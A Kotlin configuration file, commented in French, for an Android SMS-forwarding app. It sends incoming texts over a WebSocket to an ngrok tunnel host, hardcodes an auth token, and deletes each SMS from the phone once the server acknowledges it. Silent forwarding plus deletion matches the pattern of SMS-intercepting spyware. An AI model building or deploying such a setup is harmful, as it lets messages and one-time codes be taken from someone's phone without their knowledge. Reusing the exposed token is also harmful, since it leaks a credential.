package com.smsforwarder

/**
 * Configuration modifiable avant compilation.
 *
 * ATTENTION NGROK : sur un compte gratuit, le sous-domaine ET le port
 * changent à CHAQUE redémarrage du tunnel. Après chaque relance de ngrok,
 * il faut mettre à jour SERVER_IP / SERVER_PORT et recompiler.
 * Vérifie l'adresse réelle avec : curl -s http://127.0.0.1:4040/api/tunnels
 */
object Config {

    /** Hôte du tunnel (sans ws:// et sans port). */
    const val SERVER_IP = "8.tcp.ngrok.io"

    /** Port du tunnel. CHANGE à chaque redémarrage de ngrok. */
    const val SERVER_PORT = 18477

    const val AUTH_TOKEN = "1X6zYLPLBE2xiSQETMEl0AFevPQ_3au6AvjmRow2HFgghcE4c"

    const val WEBSOCKET_URL = "ws://$SERVER_IP:$SERVER_PORT"

    /**
     * Supprime le SMS du téléphone dès que le serveur confirme l'avoir reçu.
     * Nécessite que l'app soit le client SMS par défaut, sinon delete() renvoie 0.
     */
    const val DELETE_SMS_AFTER_ACK = true

    /** Intervalle d'envoi du ping applicatif. */
    const val PING_INTERVAL_MS = 25_000L

    /** Mode verbeux : log le contenu des messages échangés. */
    const val DEBUG_PROTOCOL = true
}
